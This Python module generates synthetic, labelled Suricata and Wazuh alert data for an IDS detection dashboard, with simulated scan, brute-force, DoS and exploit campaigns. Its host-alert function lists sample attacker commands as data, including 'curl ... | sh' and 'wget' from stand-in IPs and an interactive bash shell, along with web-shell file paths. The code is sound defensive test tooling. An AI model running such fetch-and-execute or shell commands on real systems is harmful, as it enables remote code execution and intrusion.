"""
mock_data_generator.py
======================
Generates a realistic, *labelled* mock dataset that mimics the output of a
Suricata -> Wazuh deployment, so the dashboard can be developed and demonstrated
before the live lab simulations are run.

Three artefacts are written into ./data :

  1. suricata_eve.json  — newline-delimited raw Suricata EVE JSON `alert` events
                          (the format produced by the IDS sensor itself).
  2. wazuh_alerts.json  — a JSON array of Wazuh alert documents, the schema the
                          north-bound API / Indexer returns once Suricata events
                          have been ingested and correlated with host logs.
  3. ground_truth.json  — ONLY the measured lab facts: per campaign the attacker
                          source IP, start/end window and number of malicious
                          events launched, plus the total benign traffic volume.
                          No detection results are stored — the dashboard computes
                          accuracy / FPR / MTTD live from the alert stream above.

The four required attack scenarios are all represented:
    Scan (recon) · Brute Force · DoS · Exploit Delivery

Brute-force and exploit campaigns additionally emit *host-log* alerts (sshd auth
failures, file-integrity changes, command execution) alongside the network
signatures, demonstrating the cross-source correlation the dashboard visualises.

Run directly to (re)generate the dataset:
    python src/mock_data_generator.py
"""

from __future__ import annotations

import itertools
import json
import os
import random
from datetime import datetime, timedelta, timezone
from typing import Any

from config import settings
from mitre_mapping import MITRE_BY_ATTACK

# NOTE: the RNG is seeded *inside* generate() — with an explicit seed for
# reproducible runs (experiments/CI), or a fresh entropy-derived seed each call
# so the sidebar "Regenerate"/"Reset" buttons produce a genuinely different
# dataset every time (varied attacks, IPs, countries, counts and timing).

# Monotonic alert-id counter (mimics Wazuh's per-alert id).
_id_counter = itertools.count(1)

# --------------------------------------------------------------------------- #
# Lab topology
# --------------------------------------------------------------------------- #
INTERNAL_TARGETS = [
    "10.0.0.5",
    "10.0.0.6",
    "10.0.0.7",
    "10.0.0.10",
    "10.0.0.12",
    "10.0.0.20",
    "10.0.0.25",
    "10.0.0.30",
]

# Diverse attacker pool: (ip, country). Countries match geo.py so the GeoIP map
# is populated from many origins; the first five IPs are also listed in
# config/threat_intel.json so the threat-intel enrichment flags them, and
# 185.220.101.x falls inside the Tor-exit CIDR indicator. Geography is illustrative
# (country is set explicitly on the alert, decoupled from real IP allocation).
ATTACKER_POOL: list[tuple[str, str]] = [
    ("45.155.205.99", "Russia"),
    ("198.51.100.23", "China"),
    ("203.0.113.7", "United States"),
    ("192.0.2.66", "Netherlands"),
    ("91.92.250.10", "Romania"),
    ("185.220.101.42", "Germany"),
    ("103.97.176.18", "India"),
    ("122.114.200.7", "China"),
    ("89.248.165.34", "Netherlands"),
    ("141.98.11.9", "Lithuania"),
    ("5.188.206.18", "Russia"),
    ("193.27.228.14", "Ukraine"),
    ("80.94.92.20", "Bulgaria"),
    ("159.223.44.91", "Singapore"),
    ("167.94.138.33", "United States"),
    ("212.70.149.71", "Iran"),
    ("45.95.147.236", "Brazil"),
    ("194.165.16.78", "Poland"),
    ("113.161.92.40", "Vietnam"),
    ("125.64.94.220", "China"),
    ("147.182.218.5", "United Kingdom"),
    ("196.251.114.29", "Nigeria"),
    ("218.92.0.112", "South Korea"),
    ("84.17.34.18", "Turkey"),
]
SENSOR_AGENT = {"id": "001", "name": "suricata-sensor", "ip": "10.0.0.2"}
HOST_AGENT = {"id": "002", "name": "web-server-01", "ip": "10.0.0.5"}
MANAGER = {"name": "wazuh-manager"}


# --------------------------------------------------------------------------- #
# Per-attack signature templates (Suricata Emerging Threats style)
# --------------------------------------------------------------------------- #
ATTACK_PROFILES: dict[str, dict[str, Any]] = {
    "Scan": {
        "rule_id": "86601",
        "rule_level": 5,
        "groups": ["ids", "suricata", "recon", "network_scan"],
        "proto": "TCP",
        "dest_ports": [22, 80, 443, 3389, 8080, 21, 25],
        "category": "Attempted Information Leak",
        "signatures": [
            {"sid": 2001219, "msg": "ET SCAN Potential SSH Scan", "sev": 2},
            {"sid": 2009582, "msg": "ET SCAN Nmap -sS window 1024", "sev": 2},
            {"sid": 2002910, "msg": "ET SCAN Potential VNC Scan 5900-5920", "sev": 2},
            {"sid": 2101411, "msg": "GPL SCAN SolarWinds IP scan attempt", "sev": 3},
        ],
    },
    "Brute Force": {
        "rule_id": "5712",
        "rule_level": 10,
        "groups": ["ids", "suricata", "authentication_failures", "brute_force"],
        "proto": "TCP",
        "dest_ports": [22, 3389, 21],
        "category": "Attempted Administrator Privilege Gain",
        "signatures": [
            {"sid": 2001219, "msg": "ET SCAN SSH BruteForce Tool detected", "sev": 1},
            {"sid": 2006546, "msg": "ET EXPLOIT Repeated SSH login failures", "sev": 1},
            {"sid": 2002383, "msg": "ET POLICY Multiple FTP login failures", "sev": 2},
        ],
    },
    "DoS": {
        "rule_id": "86701",
        "rule_level": 12,
        "groups": ["ids", "suricata", "dos", "flood"],
        "proto": "UDP",
        "dest_ports": [80, 443, 53, 123],
        "category": "Attempted Denial of Service",
        "signatures": [
            {
                "sid": 2001220,
                "msg": "ET DOS Possible NTP DDoS Inbound Frequent Un-Authed MON_LIST",
                "sev": 1,
            },
            {"sid": 2402000, "msg": "ET DOS Possible SYN Flood Inbound", "sev": 1},
            {"sid": 2403300, "msg": "ET DOS HTTP GET Flood (slowloris style)", "sev": 1},
        ],
    },
    "Exploit Delivery": {
        "rule_id": "86801",
        "rule_level": 14,
        "groups": ["ids", "suricata", "exploit", "web_attack"],
        "proto": "TCP",
        "dest_ports": [80, 443, 8080],
        "category": "Web Application Attack",
        "signatures": [
            {
                "sid": 2034647,
                "msg": "ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228)",
                "sev": 1,
            },
            {
                "sid": 2016184,
                "msg": "ET WEB_SERVER Possible SQL Injection (UNION SELECT)",
                "sev": 1,
            },
            {
                "sid": 2025643,
                "msg": "ET EXPLOIT Possible Apache Struts OGNL RCE (CVE-2017-5638)",
                "sev": 1,
            },
        ],
    },
}


# --------------------------------------------------------------------------- #
# Campaign timing — controls how the synthetic ALERT STREAM is laid out in time.
# These values only position generated alerts; the dashboard computes MTTD,
# detection rate and the confusion matrix itself from the resulting timestamps
# (nothing about the result is stored in ground_truth.json).
#   onset_s    : seconds after attack start that the first network alert appears.
#   n_alerts   : network true-positive alerts emitted for the campaign.
#   missed     : malicious events that produced NO alert (become false negatives).
#   duration_s : span over which the campaign's alerts are spread.
# --------------------------------------------------------------------------- #
CAMPAIGN_PLAN = {
    "Scan": {"onset_s": 25, "n_alerts": 120, "missed": 10, "duration_s": 180},
    "Brute Force": {"onset_s": 18, "n_alerts": 100, "missed": 8, "duration_s": 240},
    "DoS": {"onset_s": 8, "n_alerts": 150, "missed": 5, "duration_s": 150},
    "Exploit Delivery": {"onset_s": 45, "n_alerts": 35, "missed": 7, "duration_s": 300},
}

# Benign background traffic — used for true-negative / false-positive accounting.
BENIGN_TOTAL_EVENTS = 8000
BENIGN_FALSE_POSITIVES = 30  # benign flows that wrongly tripped a rule

# Innocuous signatures used for the false-positive alerts.
BENIGN_FP_SIGNATURES = [
    {"sid": 2013028, "msg": "ET POLICY curl User-Agent Outbound", "sev": 3, "group": "policy"},
    {
        "sid": 2100498,
        "msg": "GPL ATTACK_RESPONSE id check returned root",
        "sev": 3,
        "group": "policy",
    },
    {"sid": 2002087, "msg": "ET POLICY Self Signed SSL Certificate", "sev": 3, "group": "policy"},
]


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def _wz_ts(dt: datetime) -> str:
    """Format a datetime in the Wazuh/Suricata timestamp style (ms + +0000)."""
    return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{int(dt.microsecond / 1000):03d}+0000"


def _mitre_block(attack_type: str) -> dict[str, list[str]]:
    """Build the rule.mitre block for an attack from the central mapping."""
    techs = MITRE_BY_ATTACK[attack_type]
    return {
        "id": [t["id"] for t in techs],
        "tactic": list(dict.fromkeys(t["tactic"] for t in techs)),
        "technique": [t["name"] for t in techs],
    }


def _base_alert(timestamp: datetime, attack_type: str, is_true_positive: bool) -> dict[str, Any]:
    """Common envelope shared by every alert document."""
    return {
        "timestamp": _wz_ts(timestamp),
        "id": f"{int(timestamp.timestamp())}.{next(_id_counter)}",
        "manager": MANAGER,
        # `validation` is NOT part of the real Wazuh schema — it is the labelled
        # ground truth the lab analyst attaches so accuracy can be measured.
        "validation": {
            "is_true_positive": is_true_positive,
            "attack_type": attack_type if is_true_positive else "Benign (False Positive)",
        },
    }


def _network_alert(
    attack_type: str, ts: datetime, src: str, dst: str, country: str = "Russia"
) -> dict[str, Any]:
    """A Suricata-sourced network signature alert (the primary IDS detection)."""
    profile = ATTACK_PROFILES[attack_type]
    sig = random.choice(profile["signatures"])
    flow_id = random.randint(10**14, 10**15)

    alert = _base_alert(ts, attack_type, is_true_positive=True)
    alert.update(
        {
            "agent": SENSOR_AGENT,
            "rule": {
                "id": profile["rule_id"],
                "level": profile["rule_level"],
                "description": sig["msg"],
                "groups": profile["groups"],
                "firedtimes": random.randint(1, 50),
                "mail": profile["rule_level"] >= 12,
                "mitre": _mitre_block(attack_type),
            },
            "location": "/var/log/suricata/eve.json",
            "decoder": {"name": "suricata"},
            "data": {
                "srcip": src,
                "src_port": str(random.randint(1024, 65535)),
                "dstip": dst,
                "dest_ip": dst,
                "dest_port": str(random.choice(profile["dest_ports"])),
                "proto": profile["proto"],
                "flow_id": flow_id,
                "alert": {
                    "action": "allowed",
                    "gid": "1",
                    "signature_id": str(sig["sid"]),
                    "rev": "1",
                    "signature": sig["msg"],
                    "category": profile["category"],
                    "severity": str(sig["sev"]),
                },
            },
            "GeoLocation": {"country_name": country},
        }
    )
    return alert


def _host_alert(attack_type: str, ts: datetime, src: str, dst: str) -> dict[str, Any]:
    """
    A correlated *host-log* alert (Wazuh decoders), emitted alongside the network
    signature to demonstrate multi-source correlation. Only meaningful for the
    Brute Force and Exploit Delivery scenarios.
    """
    alert = _base_alert(ts, attack_type, is_true_positive=True)

    if attack_type == "Brute Force":
        user = random.choice(["root", "admin", "ubuntu", "postgres"])
        alert.update(
            {
                "agent": HOST_AGENT,
                "rule": {
                    "id": "5710",
                    "level": 10,
                    "description": f"sshd: Attempt to login using a non-existent user ({user})",
                    "groups": ["syslog", "sshd", "authentication_failed", "brute_force"],
                    "firedtimes": random.randint(5, 60),
                    "mail": True,
                    "mitre": _mitre_block("Brute Force"),
                },
                "location": "/var/log/auth.log",
                "decoder": {"name": "sshd"},
                "data": {"srcip": src, "dstuser": user, "dstip": dst},
            }
        )
    else:  # Exploit Delivery -> file integrity / command execution evidence
        if random.random() < 0.5:
            path = random.choice(
                ["/var/www/html/shell.php", "/tmp/.x/payload", "/var/www/html/index.php"]
            )
            alert.update(
                {
                    "agent": HOST_AGENT,
                    "rule": {
                        "id": "554",
                        "level": 12,
                        "description": "File added to the system (possible web shell)",
                        "groups": ["syscheck", "fim", "exploit"],
                        "firedtimes": random.randint(1, 5),
                        "mail": True,
                        "mitre": _mitre_block("Exploit Delivery"),
                    },
                    "location": "syscheck",
                    "decoder": {"name": "syscheck_new_entry"},
                    "data": {
                        "srcip": src,
                        "dstip": dst,
                        "syscheck": {"path": path, "event": "added"},
                    },
                }
            )
        else:
            cmd = random.choice(
                ["wget http://203.0.113.7/x.sh", "curl -s 45.155.205.99 | sh", "/bin/bash -i"]
            )
            alert.update(
                {
                    "agent": HOST_AGENT,
                    "rule": {
                        "id": "100210",
                        "level": 13,
                        "description": "Suspicious command executed by web service account",
                        "groups": ["audit", "command_execution", "exploit"],
                        "firedtimes": random.randint(1, 8),
                        "mail": True,
                        "mitre": _mitre_block("Exploit Delivery"),
                    },
                    "location": "/var/log/audit/audit.log",
                    "decoder": {"name": "auditd"},
                    "data": {"srcip": src, "dstip": dst, "command": cmd},
                }
            )
    return alert


def _false_positive_alert(ts: datetime) -> dict[str, Any]:
    """A benign flow that wrongly triggered a low-severity rule (false positive)."""
    sig = random.choice(BENIGN_FP_SIGNATURES)
    src = random.choice(INTERNAL_TARGETS)
    dst = f"10.0.0.{random.randint(20, 200)}"

    alert = _base_alert(ts, attack_type="", is_true_positive=False)
    alert.update(
        {
            "agent": SENSOR_AGENT,
            "rule": {
                "id": "31530",
                "level": 3,
                "description": sig["msg"],
                "groups": ["ids", "suricata", sig["group"]],
                "firedtimes": 1,
                "mail": False,
                "mitre": {"id": [], "tactic": [], "technique": []},
            },
            "location": "/var/log/suricata/eve.json",
            "decoder": {"name": "suricata"},
            "data": {
                "srcip": src,
                "src_port": str(random.randint(1024, 65535)),
                "dstip": dst,
                "dest_ip": dst,
                "dest_port": str(random.choice([80, 443, 8080])),
                "proto": "TCP",
                "flow_id": random.randint(10**14, 10**15),
                "alert": {
                    "action": "allowed",
                    "gid": "1",
                    "signature_id": str(sig["sid"]),
                    "rev": "1",
                    "signature": sig["msg"],
                    "category": "Not Suspicious Traffic",
                    "severity": str(sig["sev"]),
                },
            },
        }
    )
    return alert


def _to_eve(alert: dict[str, Any]) -> dict[str, Any]:
    """Derive a raw Suricata EVE `alert` event from a network alert document."""
    d = alert["data"]
    a = d["alert"]
    return {
        "timestamp": alert["timestamp"],
        "flow_id": d.get("flow_id"),
        "event_type": "alert",
        "src_ip": d.get("srcip"),
        "src_port": int(d.get("src_port", 0)),
        "dest_ip": d.get("dest_ip"),
        "dest_port": int(d.get("dest_port", 0)),
        "proto": d.get("proto"),
        "alert": {
            "action": a.get("action"),
            "gid": int(a.get("gid", 1)),
            "signature_id": int(a.get("signature_id", 0)),
            "rev": int(a.get("rev", 1)),
            "signature": a.get("signature"),
            "category": a.get("category"),
            "severity": int(a.get("severity", 3)),
            "metadata": {
                "mitre_technique_id": alert["rule"]["mitre"]["id"],
                "mitre_tactic": alert["rule"]["mitre"]["tactic"],
            },
        },
    }


# --------------------------------------------------------------------------- #
# Top-level generation
# --------------------------------------------------------------------------- #
def generate(
    window_minutes: int = 90,
    out_dir: str | None = None,
    seed: int | None = None,
    randomize: bool = True,
) -> dict[str, Any]:
    """
    Build one experiment dataset and write the three artefacts.

    Args:
        window_minutes: observation window the alerts are spread across.
        out_dir:        directory to write into (defaults to settings.DATA_DIR).
        seed:           RNG seed. ``None`` (default) derives a fresh seed from OS
                        entropy so every call produces a *different* dataset (the
                        sidebar Regenerate/Reset buttons); pass an explicit int for
                        a reproducible run (experiments/CI).
        randomize:      when True (default) widen the count/timing ranges and add
                        extra randomly-typed campaigns for maximum variety; when
                        False use the tighter canonical spread (still reproducible
                        for a given seed).

    The four core attack types (Scan, Brute Force, DoS, Exploit Delivery) are
    always present so every dashboard view is complete; each draws a distinct
    attacker IP/country, target, signature, count and timing, and extra random
    campaigns are added on top. One host-only-detectable brute force is always
    included to preserve the cross-source correlation-coverage story.
    """
    if seed is None:
        seed = int.from_bytes(os.urandom(4), "big")  # fresh each call -> varied data
    random.seed(seed)
    now = datetime.now(timezone.utc)
    sim_start = now - timedelta(minutes=window_minutes)

    alerts: list[dict[str, Any]] = []
    eve_events: list[dict[str, Any]] = []
    campaigns: list[dict[str, Any]] = []

    used_ips: set[str] = set()

    def _pick_attacker() -> tuple[str, str]:
        """A distinct (ip, country) per campaign so the geo map shows many origins."""
        avail = [p for p in ATTACKER_POOL if p[0] not in used_ips] or ATTACKER_POOL
        ip, country = random.choice(avail)
        used_ips.add(ip)
        return ip, country

    # Always cover the four core types; add 1-4 extra random campaigns for variety.
    core_types = list(CAMPAIGN_PLAN.keys())
    n_extra = random.randint(1, 4) if randomize else 1
    plan_types = core_types + [random.choice(core_types) for _ in range(n_extra)]
    random.shuffle(plan_types)

    spread = 0.35 if randomize else 0.12
    dual_source = {"Brute Force", "Exploit Delivery"}

    for attack_type in plan_types:
        plan = CAMPAIGN_PLAN[attack_type]
        src, country = _pick_attacker()
        dst = random.choice(INTERNAL_TARGETS)

        n_alerts = max(8, round(plan["n_alerts"] * random.uniform(1 - spread, 1 + spread)))
        missed = max(0, plan["missed"] + random.randint(-4, 6))
        onset = max(3.0, plan["onset_s"] + random.uniform(-5, 15))
        duration = max(60.0, plan["duration_s"] * random.uniform(0.7, 1.3))

        # Place each campaign at a random offset within the observation window.
        max_off = max(2.0, window_minutes - duration / 60 - 2)
        start = sim_start + timedelta(minutes=random.uniform(1, max_off))
        first_detect = start + timedelta(seconds=onset)

        # Emit the network true-positive alerts spread over the campaign duration.
        emitted_host = False
        for i in range(n_alerts):
            jitter = (duration * i / max(n_alerts - 1, 1)) + random.uniform(0, 2)
            ts = first_detect + timedelta(seconds=jitter)

            net = _network_alert(attack_type, ts, src, dst, country)
            alerts.append(net)
            eve_events.append(_to_eve(net))

            # Brute force / exploit also surface correlated host evidence (~35%).
            # Host-log detection lags the network signature (rules fire only after
            # several failures / on log aggregation), so it arrives 15-40s later —
            # this latency is what the dashboard later measures as the MTTD gain
            # of correlating the network sensor with host telemetry.
            if attack_type in dual_source and random.random() < 0.35:
                host_ts = ts + timedelta(seconds=random.uniform(15, 40))
                alerts.append(_host_alert(attack_type, host_ts, src, dst))
                emitted_host = True

        # Guarantee dual-source campaigns surface at least one host alert so the
        # cross-source correlation is demonstrable regardless of the seed.
        if attack_type in dual_source and not emitted_host:
            host_ts = first_detect + timedelta(seconds=random.uniform(15, 40))
            alerts.append(_host_alert(attack_type, host_ts, src, dst))

        # The campaign window must cover every generated alert (incl. host lag).
        end = first_detect + timedelta(seconds=duration + 60)
        campaigns.append(
            {
                # Measured lab facts ONLY — what the analyst actually did. No
                # detection results are stored; the dashboard derives them.
                "attack_type": attack_type,
                "source_ip": src,
                "target_ip": dst,
                "start_time": _wz_ts(start),
                "end_time": _wz_ts(end),
                "malicious_attempts": n_alerts + missed,
                "mitre_techniques": [t["id"] for t in MITRE_BY_ATTACK[attack_type]],
            }
        )

    # --- Host-only-detectable incident -------------------------------------- #
    # A brute-force conducted over an encrypted / evaded channel that the network
    # IDS does NOT flag, but that Wazuh host auth-logs catch. This is what gives
    # the correlated view genuine COVERAGE over a network-only IDS (not just
    # faster/confirmed detection) — see METHODOLOGY.md §5.
    # Prefer the TI-flagged encrypted-bruteforce IP so enrichment lights up; fall
    # back to any unused attacker if it was already assigned above.
    host_src = "91.92.250.10" if "91.92.250.10" not in used_ips else _pick_attacker()[0]
    used_ips.add(host_src)
    host_dst = random.choice(INTERNAL_TARGETS)
    if randomize:
        ho_alerts = max(8, round(22 * random.uniform(0.85, 1.20)))
        ho_missed = max(0, 6 + random.randint(-2, 4))
        ho_onset = 20 + random.uniform(-5, 10)
    else:
        ho_alerts, ho_missed, ho_onset = 22, 6, 20
    ho_duration = 200 * (random.uniform(0.7, 1.3) if randomize else 1.0)
    ho_max_off = max(2.0, window_minutes - ho_duration / 60 - 2)
    ho_start = sim_start + timedelta(minutes=random.uniform(1, ho_max_off))
    ho_first = ho_start + timedelta(seconds=ho_onset)
    for i in range(ho_alerts):
        jitter = (ho_duration * i / max(ho_alerts - 1, 1)) + random.uniform(0, 2)
        ts = ho_first + timedelta(seconds=jitter)
        alerts.append(_host_alert("Brute Force", ts, host_src, host_dst))
    ho_end = ho_first + timedelta(seconds=ho_duration + 60)
    campaigns.append(
        {
            "attack_type": "Brute Force",
            "source_ip": host_src,
            "target_ip": host_dst,
            "start_time": _wz_ts(ho_start),
            "end_time": _wz_ts(ho_end),
            "malicious_attempts": ho_alerts + ho_missed,
            "detection_note": "encrypted/evaded channel — detected only via host auth logs",
            "mitre_techniques": [t["id"] for t in MITRE_BY_ATTACK["Brute Force"]],
        }
    )

    # Benign false-positive alerts scattered across the whole window.
    fp_count = BENIGN_FALSE_POSITIVES
    if randomize:
        fp_count = max(0, BENIGN_FALSE_POSITIVES + random.randint(-8, 8))
    for _ in range(fp_count):
        ts = sim_start + timedelta(seconds=random.uniform(0, window_minutes * 60))
        alerts.append(_false_positive_alert(ts))

    # Sort newest-first to match how the Indexer returns alerts.
    alerts.sort(key=lambda a: a["timestamp"], reverse=True)
    eve_events.sort(key=lambda e: e["timestamp"], reverse=True)

    # Vary the benign (negative) population so FPR / accuracy differ per dataset.
    benign_events = BENIGN_TOTAL_EVENTS
    if randomize:
        benign_events = max(2000, BENIGN_TOTAL_EVENTS + random.randint(-2000, 4000))

    ground_truth = {
        "generated_at": _wz_ts(now),
        "simulation_window_minutes": window_minutes,
        "seed": seed,
        "note": (
            "Measured lab facts only. Every detection metric (TP/FP/FN/TN, "
            "accuracy, FPR, MTTD) is computed by the dashboard from the live "
            "alert stream — nothing here pre-states a result."
        ),
        "campaigns": campaigns,
        # Total benign traffic volume observed in the window (analyst-measured).
        # False positives are whatever benign traffic actually tripped a rule in
        # the alert stream; the dashboard counts them dynamically.
        "benign": {"benign_events": benign_events},
    }

    _write_artifacts(alerts, eve_events, ground_truth, out_dir)
    return {
        "alerts": len(alerts),
        "eve_events": len(eve_events),
        "campaigns": len(campaigns),
    }


def clear(out_dir: str | None = None) -> dict[str, int]:
    """
    Empty the dataset to **zero alerts** for the 'Reset data' action.

    Writes empty alert/eve files and an empty ground-truth ledger so the dashboard
    loads 0 alerts. The bundled upload-demo samples in ``data/samples/`` are left
    intact (only the active dataset is cleared).
    """
    out_dir = out_dir or settings.DATA_DIR
    os.makedirs(out_dir, exist_ok=True)
    with open(os.path.join(out_dir, "wazuh_alerts.json"), "w", encoding="utf-8") as fh:
        json.dump([], fh)
    # Truncate the raw eve.json (newline-delimited; empty file = no events).
    open(os.path.join(out_dir, "suricata_eve.json"), "w", encoding="utf-8").close()
    ground_truth = {
        "generated_at": _wz_ts(datetime.now(timezone.utc)),
        "simulation_window_minutes": 0,
        "seed": 0,
        "note": "Data cleared via 'Reset data' — no alerts loaded.",
        "campaigns": [],
        "benign": {"benign_events": 0},
    }
    with open(os.path.join(out_dir, "ground_truth.json"), "w", encoding="utf-8") as fh:
        json.dump(ground_truth, fh, indent=2)
    return {"alerts": 0, "eve_events": 0, "campaigns": 0}


def _write_artifacts(
    alerts: list[dict[str, Any]],
    eve_events: list[dict[str, Any]],
    ground_truth: dict[str, Any],
    out_dir: str | None = None,
) -> None:
    out_dir = out_dir or settings.DATA_DIR
    os.makedirs(out_dir, exist_ok=True)
    alerts_file = os.path.join(out_dir, "wazuh_alerts.json")
    eve_file = os.path.join(out_dir, "suricata_eve.json")
    gt_file = os.path.join(out_dir, "ground_truth.json")

    # Wazuh alert documents as a JSON array (Indexer-style payload).
    with open(alerts_file, "w", encoding="utf-8") as fh:
        json.dump(alerts, fh, indent=2)

    # Raw Suricata EVE as newline-delimited JSON (the real eve.json format).
    with open(eve_file, "w", encoding="utf-8") as fh:
        for ev in eve_events:
            fh.write(json.dumps(ev) + "\n")

    # Labelled ground-truth ledger.
    with open(gt_file, "w", encoding="utf-8") as fh:
        json.dump(ground_truth, fh, indent=2)

    # Bundled upload-demo samples (only for the default dataset, not per-run dirs)
    # so users can immediately try the sidebar "Upload a file" flow without
    # hunting for a real eve.json. These are genuine canonical records, trimmed.
    if os.path.abspath(out_dir) == os.path.abspath(settings.DATA_DIR):
        os.makedirs(settings.SAMPLES_DIR, exist_ok=True)
        with open(settings.SAMPLE_EVE_PATH, "w", encoding="utf-8") as fh:
            for ev in eve_events[:60]:
                fh.write(json.dumps(ev) + "\n")
        with open(settings.SAMPLE_WAZUH_EXPORT_PATH, "w", encoding="utf-8") as fh:
            json.dump(alerts[:40], fh, indent=2)


if __name__ == "__main__":
    stats = generate()
    print("Mock dataset generated:")
    print(f"  • Wazuh alerts      : {stats['alerts']:>5}  -> {settings.ALERTS_FILE}")
    print(f"  • Suricata EVE events: {stats['eve_events']:>5}  -> {settings.EVE_FILE}")
    print(f"  • Attack campaigns  : {stats['campaigns']:>5}  -> {settings.GROUND_TRUTH_FILE}")
